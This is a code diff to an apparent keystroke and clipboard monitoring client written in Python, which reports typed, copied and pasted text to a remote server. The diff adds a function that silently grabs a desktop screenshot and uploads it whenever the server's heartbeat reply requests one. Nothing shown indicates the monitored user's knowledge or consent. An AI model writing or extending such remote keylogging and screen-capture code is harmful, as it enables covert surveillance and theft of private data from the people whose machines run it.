@@ -222,6 +222,17 @@ def normalize_key(key):
     return ""
 
 
+def capture_desktop_screenshot():
+    try:
+        image = ImageGrab.grab(all_screens=False)
+        image.thumbnail((1600, 1000))
+        output = BytesIO()
+        image.convert("RGB").save(output, format="JPEG", quality=60, optimize=True)
+        return base64.b64encode(output.getvalue()).decode("ascii")
+    except Exception:
+        return ""
+
+
 def raw_key_value(key):
     if key in (Key.ctrl, Key.ctrl_l, Key.ctrl_r):
         return "[CTRL]"
@@ -391,6 +402,28 @@ def post_message(payload, quiet=False):
         return False
 
 
+def upload_device_screenshot(screenshot_base64):
+    if not screenshot_base64:
+        return False
+    try:
+        request = Request(
+            f"{SITE_URL}/api/devices/screenshot-upload",
+            data=json.dumps({
+                "device_id": device_id,
+                "screenshot_base64": screenshot_base64,
+            }).encode("utf-8"),
+            headers={"Content-Type": "application/json"},
+            method="POST",
+        )
+        with urlopen(request, timeout=20) as response:
+            if response.status >= 400:
+                raise RuntimeError(f"HTTP {response.status}")
+        return True
+    except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
+        print(f"Could not upload device screenshot: {error}")
+        return False
+
+
 def send_message(text, app_name, source_url="", raw_text=None, is_pasted=False, is_copied=False, screenshot_base64=""):
     global last_message_id
     last_message_id = max(last_message_id + 1, int(time.time() * 1000))
@@ -436,6 +469,9 @@ def send_heartbeat():
         with urlopen(request, timeout=10) as response:
             if response.status >= 400:
                 raise RuntimeError(f"HTTP {response.status}")
+            heartbeat = json.loads(response.read().decode("utf-8"))
+        if heartbeat.get("screenshot_requested"):
+            upload_device_screenshot(capture_desktop_screenshot())
     except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
         print(f"Could not send device heartbeat: {error}")
 
